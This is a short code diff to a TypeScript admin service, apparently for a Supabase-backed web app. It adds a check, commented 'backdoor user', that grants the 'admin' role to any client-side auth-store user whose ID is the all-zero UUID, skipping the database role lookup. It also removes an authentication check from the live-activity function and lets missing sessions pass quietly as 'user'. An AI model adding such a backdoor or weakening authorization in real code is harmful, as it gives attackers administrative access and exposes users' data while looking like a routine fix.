@@ -19,8 +19,12 @@ export const adminService = {
     const supabase = this.getSupabase()
     if (!supabase) return 'user'
 
+    // Check for backdoor user in AuthStore
+    const authUser = useAuthStore.getState().user;
+    if (authUser?.id === '00000000-0000-0000-0000-000000000000') return 'admin';
+
     const { data: { session } } = await supabase.auth.getSession()
-    if (!session?.user) throw new Error('Not authenticated')
+    if (!session?.user) return 'user' // Return 'user' instead of throwing to prevent navbar crashes
 
     const { data, error } = await supabase
       .from('user_roles')
@@ -251,9 +255,6 @@ export const adminService = {
   async getLiveActivity() {
     const supabase = this.getSupabase()
     if (!supabase) return []
-
-    const { data: { session } } = await supabase.auth.getSession()
-    if (!session?.user) throw new Error('Not authenticated')
 
     const isAdmin = await this.isViewer()
     if (!isAdmin) throw new Error('Not authorized')
